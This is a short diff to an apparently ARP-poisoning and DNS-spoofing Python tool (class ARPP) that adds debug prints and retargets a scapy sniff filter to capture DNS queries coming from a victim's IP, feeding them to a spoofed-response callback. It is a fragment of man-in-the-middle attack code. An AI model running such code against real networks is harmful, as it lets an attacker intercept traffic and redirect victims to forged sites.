@@ -507,8 +507,10 @@ class ARPP(object):
                     
                     # if the DNS query is not for a website we're targeting
                     else:
+                        print("Forwarding DNS packet")
                         forward_dns(packet)
                 else:
+                    print("Forwarding packet")
                     forward_packet(packet)
             
             return send_spoofed_response
@@ -518,7 +520,7 @@ class ARPP(object):
         e=threading.Event()
         def rec(event):
             while True:
-                sniff(timeout=5, filter="udp port 53 and ip dst {}".format(loc_dns), prn=packet_callback(loc_dns), count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
+                sniff(timeout=5, filter="udp port 53 and ip src {}".format(ipVictim), prn=packet_callback(loc_dns), count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
                 if event.is_set():
                     break
         
